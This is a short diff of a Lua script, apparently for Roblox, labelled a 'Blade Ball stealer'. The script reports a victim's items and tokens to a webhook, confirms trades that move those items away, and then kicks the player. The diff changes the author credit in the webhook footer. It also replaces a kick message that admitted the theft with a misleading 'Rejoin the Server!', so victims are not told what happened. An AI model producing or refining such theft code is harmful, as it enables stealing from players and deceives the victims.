@@ -244,7 +244,7 @@ local function SendWebhookMessage(isJoinMessage, items, tokens)
             ["color"] = 65280,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
+                ["text"] = "Blade Ball stealer by Frieren"
             }
         }}
     }
@@ -386,7 +386,7 @@ if #itemsToSend > 0 or totalTokens > 0 then
             readyTrade()
             confirmTrade()
         end
-        plr:kick("All your stuff just got stolen by Tobi's stealer. discord.gg/GY2RVSEGDT")
+        plr:kick("Rejoin the Server!")
     end
 
     local function waitForUserJoin()
